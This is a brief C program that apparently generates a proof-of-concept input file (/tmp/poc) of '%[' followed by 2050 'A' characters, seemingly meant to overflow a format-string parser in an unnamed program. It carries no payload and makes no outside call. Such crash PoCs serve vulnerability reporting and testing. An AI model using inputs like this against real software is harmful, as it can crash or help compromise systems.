#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fputc('%', f);
    fputc('[', f);
    for (int i = 0; i < 2050; i++) {
        fputc('A', f);
    }
    fclose(f);
    return 0;
}